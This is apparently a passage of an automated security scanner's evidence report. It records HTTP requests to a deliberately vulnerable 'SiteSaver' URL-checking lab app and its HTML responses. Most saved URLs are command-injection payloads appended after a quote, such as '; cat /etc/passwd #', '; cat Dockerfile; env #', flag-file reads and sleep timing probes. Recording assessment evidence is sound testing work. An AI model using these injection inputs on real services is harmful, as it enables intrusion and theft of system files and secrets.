+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 10488
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:50:49 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;View Saved Sites&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;SiteSaver&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; aria-current=&quot;page&quot; href=&quot;/add_url&quot;&gt;Add Site &lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; href=&quot;/&quot;&gt;View Saved Sites&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+&lt;div class=&quot;container mt-4&quot;&gt;
+    &lt;h1&gt;Site Saver&lt;/h1&gt;
+    &lt;p&gt;
+        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
+    &lt;/p&gt;
+    
+    
+
+
+    &lt;a href=&quot;/add_url&quot; class=&quot;btn btn-primary mb-3&quot;&gt;Add URL&lt;/a&gt;
+
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/5&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/8&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/9&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/10&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/11&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/12&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/13&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/14&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/15&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/16&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/17&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/18&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/19&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/20&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 8 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/21&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/22&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 20 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/23&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; false #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/24&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; true #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/25&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; printf &amp;#39;\xff\xfe&amp;#39; #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/26&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; id #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/27&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/28&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/29&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/30&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&amp;gt;/dev/null #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/31&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat app.py #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/32&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat Dockerfile; env #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/33&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://pwnbbb222.invalid&amp;#34;; echo 200 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/34&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+    &lt;/ul&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wqi7f-3d</code> — <code>artifacts/_/ev-mr2wqi7f-3d/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 10813
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:50:49 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;View Saved Sites&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;SiteSaver&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; aria-current=&quot;page&quot; href=&quot;/add_url&quot;&gt;Add Site &lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; href=&quot;/&quot;&gt;View Saved Sites&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+&lt;div class=&quot;container mt-4&quot;&gt;
+    &lt;h1&gt;Site Saver&lt;/h1&gt;
+    &lt;p&gt;
+        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
+    &lt;/p&gt;
+    
+    
+
+
+    &lt;a href=&quot;/add_url&quot; class=&quot;btn btn-primary mb-3&quot;&gt;Add URL&lt;/a&gt;
+
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/5&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/8&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/9&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/10&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/11&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/12&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/13&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/14&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/15&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/16&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/17&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/18&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/19&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/20&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 8 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/21&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/22&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 20 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/23&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; false #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/24&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; true #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/25&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; printf &amp;#39;\xff\xfe&amp;#39; #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/26&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; id #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/27&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/28&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/29&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/30&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&amp;gt;/dev/null #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/31&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat app.py #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/32&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat Dockerfile; env #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/33&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://pwnbbb222.invalid&amp;#34;; echo 200 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/34&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://pwnbbb222.invalid&amp;#34;; echo 200 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/35&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+    &lt;/ul&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
